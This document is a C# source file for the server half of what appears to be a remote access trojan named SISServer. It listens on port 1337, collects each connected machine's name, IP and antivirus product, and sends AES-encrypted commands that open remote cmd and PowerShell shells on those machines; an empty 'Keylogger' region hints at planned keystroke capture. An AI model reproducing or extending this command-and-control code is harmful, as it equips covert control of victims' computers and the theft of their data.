using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.IO;
using System.Drawing.Imaging;
using System.Runtime.Serialization.Formatters.Binary;

namespace SISServer
{
    public partial class Form1 : Form
    {
        private static Socket _serverSocket;
        private static readonly List<Socket> _clientSockets = new List<Socket>();
        private const int _BUFFER_SIZE = 20971520;
        private const int _PORT = 1337;
        private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
        private string connectedID, connectedName = "";
        public static bool cmdStarted = false;
        public static bool pwshellStarted = false;

        public Form1()
        {
            InitializeComponent();
        }

        private void SetupServer()
        {
            label1.Text = "Setting up server";
            try
            {
                _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                _serverSocket.Bind(new IPEndPoint(IPAddress.Any, _PORT));
                _serverSocket.Listen(5);
                _serverSocket.BeginAccept(AcceptCallback, null);
                label1.Text = "Server is up";
            }
            catch(Exception ex)
            {
                label1.Text = ex.Message.ToString();
                return;
            }
        }

        private void listCLients()
        {
            int a = 0;
            listView1.Items.Clear();
            foreach (Socket s in _clientSockets)
            {
                ListViewItem i = new ListViewItem();
                i.Text = a.ToString();
                listView1.Items.Add(i);
                a++;               
            }
        }
        
        private void CloseAllSockets()
        {
            foreach(Socket s in _clientSockets)
            {
                s.Shutdown(SocketShutdown.Both);
                s.Close();
            }
            _serverSocket.Close();
        }

        private void AcceptCallback(IAsyncResult AR)
        {
            Socket socket;

            try
            {
                socket = _serverSocket.EndAccept(AR);
            }
            catch (Exception)
            {
                Console.WriteLine("Accept callback error");
                return;
            }

            _clientSockets.Add(socket);
            int id = _clientSockets.Count - 1;
            addlvClients(id.ToString());
            string info = "systeminfo-" + id;
            sendCommand(info, id);
            socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket);
            Console.WriteLine("Client Connected...");
            _serverSocket.BeginAccept(AcceptCallback, null); 
        }

        private delegate void addlvClient(String clientid);

        private void addlvClients(String clientid)
        {
            if (this.InvokeRequired)
            {
                addlvClient k = new addlvClient(addlvClients);
                this.Invoke(k, new object[] {clientid});
            }
            else
            {
                listView1.Items.Add(clientid);
            }
        }

        private void ReceiveCallback(IAsyncResult AR)
        {
            Socket current = (Socket)AR.AsyncState;
            int recieved;
            try
            {
                recieved = current.EndReceive(AR);
            }
            catch (SocketException)
            {
                Console.WriteLine("ReceiveCallback error");
                return;
            }
            byte[] recBuffer = new byte[recieved];
            Array.Copy(_buffer, recBuffer, recieved);
            string text = Encoding.Unicode.GetString(recBuffer);
            text = Decrypt(text);
            if (text.StartsWith("systeminfo"))
            {
                int id = int.Parse(text.Split(';')[1]);
                string data = text.Split(';')[2];
                String[] rows = data.Split('€');
                string name = rows[0];
                string ip = rows[1];
                string antivirus = rows[2];

                setlvClientInfoCallback(name, ip, antivirus, id);
            }
            if (text.StartsWith("cmd"))
            {
                string output = text.Split('§')[1];
                append(output);
            }
            if (text.StartsWith("powershell"))
            {
                string output = text.Split('§')[1];
                append(output);
            }
            current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);
        }
        int a = 0;
        private delegate void appendText(String text);
        private void append(String text)
        {
            if (this.InvokeRequired)
            {
                appendText callback = new appendText(append);
                this.Invoke(callback, new object[] { text });
            }
            else
            {
                if (a == 1) richTextBox1.Text += text;
                if (a == 2) richTextBox2.Text += text;
            }
        }

        private delegate void setlvClientInfo(String name, String ip, String av, int id);


        private void setlvClientInfoCallback(String name, String ip, String av, int id)
        {
            if (this.InvokeRequired)
            {
                setlvClientInfo k = new setlvClientInfo(setlvClientInfoCallback);
                this.Invoke(k, new object[] { name, ip, av, id });
            }
            else
            {
                ListViewItem client = listView1.Items[id];
                client.SubItems.Add(name);
                client.SubItems.Add(ip);
                client.SubItems.Add(av);
                connectedName = name;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            SetupServer();
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listCLients();
        }

        public static string Encrypt(string clearText)
        {
            try
            {
                string EncryptionKey = "SOMERANDKEY9189231215";
                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);

                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return clearText;
            }
        }

        public static string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "SOMERANDKEY9189231215";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine("Cipher Text: " + cipherText);
                return "error";
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if(listView1.SelectedItems.Count > 0)
            {
                string id = listView1.SelectedItems[0].Text;
                //sendCommand("control", int.Parse(id));
                connectedID = id;
                label3.Text = connectedName;
            }
        }

        private static void sendCommand(String command, int targetClient)
        {
            Socket s = _clientSockets[targetClient];
            String k = command;

            String crypted = Encrypt(k);
            byte[] data = System.Text.Encoding.Unicode.GetBytes(crypted);
            s.Send(data);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            richTextBox1.ReadOnly = true;
            richTextBox2.ReadOnly = true;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            sendCommand("startcmd", int.Parse(connectedID));
            cmdStarted = true;
            button6.Text = "Stop CMD";
        }

        private void button7_Click(object sender, EventArgs e)
        {
            sendCommand("startpowershell", int.Parse(connectedID));
            pwshellStarted = true;
            button7.Text = "Stop Powershell";
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            a = 1;
            if (e.KeyCode == Keys.Return && cmdStarted)
            {
                String command = "cmd§" + textBox2.Text;
                textBox2.Text = "";
                if (command == "cmd§cls" || command == "cmd§clear")
                {
                    richTextBox1.Clear();
                    return;
                }

                if (command == "cmd§exit")
                {
                    DialogResult result = MessageBox.Show(this, "Do you want to exit from the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
                    if (result == DialogResult.Yes)
                    {
                        sendCommand("stopcmd", int.Parse(connectedID));
                        button6.Text = "Start CMD";
                        cmdStarted = false;
                        return;
                    }
                    else if (result == DialogResult.Cancel)
                    {
                        return;
                    }
                }
                sendCommand(command, int.Parse(connectedID));
            }
            else if (e.KeyCode == Keys.Return && !cmdStarted)
            {
                MessageBox.Show(this, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        private void textBox3_KeyDown(object sender, KeyEventArgs e)
        {
            a = 2;
            if (e.KeyCode == Keys.Return && pwshellStarted)
            {
                String command = "powershell§" + textBox3.Text; 
                textBox3.Text = "";
                if (command == "powershell§cls" || command == "powershell§clear")
                {
                    richTextBox1.Clear();
                    return;
                }

                if (command == "powershell§exit")
                {
                    DialogResult result = MessageBox.Show(this, "Do you want to exit from the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
                    if (result == DialogResult.Yes)
                    {
                        sendCommand("stoppowershell", int.Parse(connectedID));
                        button7.Text = "Start Powershell";
                        cmdStarted = false;
                        return;
                    }
                    else if (result == DialogResult.Cancel)
                    {
                        return;
                    }
                }
                sendCommand(command, int.Parse(connectedID));
            }
            else if (e.KeyCode == Keys.Return && !pwshellStarted) 
            {
                MessageBox.Show(this, "Powershell Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }
   

        private void button2_Click(object sender, EventArgs e)
        {
                sendCommand(textBox1.Text, int.Parse(connectedID));
        }

        #region Keylogger

        

        #endregion

    }
}
